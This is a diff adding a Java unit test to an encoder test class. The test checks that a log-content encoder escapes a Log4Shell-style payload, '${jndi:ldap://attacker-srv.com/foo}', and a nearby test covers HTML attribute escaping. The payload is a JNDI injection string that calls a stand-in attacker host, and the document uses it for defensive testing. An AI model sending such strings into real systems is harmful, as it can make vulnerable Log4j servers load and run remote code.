@@ -99,6 +99,16 @@ class EncoderTest {
   }
 
   @Test
+  void forLogContent_actual_tainted_log4j_successfully() {
+
+    String barbi = "${jndi:ldap://attacker-srv.com/foo}";
+    String expected = "&dollar;{jndi:ldap://attacker-srv.com/foo}";
+
+    String actual = forLogContent(barbi);
+    Assertions.assertEquals(expected, actual);
+  }
+
+  @Test
   void forHtmlAttributeXss_successfullyWithResult_array() {
     char[] chars = {'a', 'b', 'c', 'd', 'e', '<', '>'};
     String expected = "abcde&lt;>";
